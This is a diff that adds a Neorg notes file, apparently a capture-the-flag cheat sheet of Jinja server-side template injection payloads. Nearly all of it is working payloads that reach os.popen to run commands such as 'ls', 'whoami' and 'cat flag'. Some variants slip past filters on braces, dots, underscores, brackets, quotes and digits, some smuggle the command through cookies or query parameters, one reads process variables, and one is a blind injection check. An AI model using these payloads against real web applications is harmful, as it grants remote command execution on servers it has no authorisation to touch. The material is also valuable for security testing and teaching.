@@ -1,0 +1,77 @@
+* Jinja
+
+** Basic
+
+@code python
+{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']("ls").read()}}
+{{''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']("ls").read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+@end
+
+** No `{{ / }}`
+
+@code python
+{% print self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__["popen"]("whoami").read()[0] %}
+@end
+
+** `[^.]`
+
+@code python
+{{self["__class__"]}}
+{{self|attr("__class__")}}
+
+{{''['__class__']['__mro__'][1]['__subclasses__']()[117]["__init__"]["__globals__"]["popen"]("ls")["read"]()}}
+{{self|attr("__init__")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("ls")|attr("read")()}}
+@end
+
+** `[^_]`
+
+@code python
+{{self["\x5f\x5fclass\x5f\x5f"]}}
+{{self|attr("\x5f\x5fclass\x5f\x5f)}}
+@end
+
+** `[^\[\]]`
+
+@code python
+{{''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.cookies.function)(request.cookies.cmd).read()}}
+(Cookies: function=popen; cmd=ls)
+@end
+
+** `[^'"\.0-9]`
+
+@code python
+{{lipsum[(dict(__globals__=x)|list)[False]][(dict(os=x)|list)[False]][(dict(popen=x)|list)[False]]([(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join)[(dict(daer=x)|list)[False]|reverse]()}}
+@end
+
+** No quotes
+
+
+@code python
+{{self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[request.cookies.f](request.cookies.cmd).read()}}
+(Cookies: f=popen; cmd=ls)
+@end
+
+@code python
+{{self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[request.args.f](request.args.cmd).read()}}
+(/?f=popen&cmd=ls)
+@end
+
+@code python
+request.values.f
+request.headers.f
+@end
+
+** Read variables
+
+If the goal isn't RCE but to read the value of a variable of the current process (might not be possible via RCE), we can import main and expose the variable.
+
+@code python
+{{ self.__init__.__globals__['__builtins__']['__import__']('__main__') }}
+@end
+
+** Blind SSTI
+
+@code
+{% if self.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__["popen"]("whoami").read()[0] == 'r' %} 1 {% endif %}
+@end
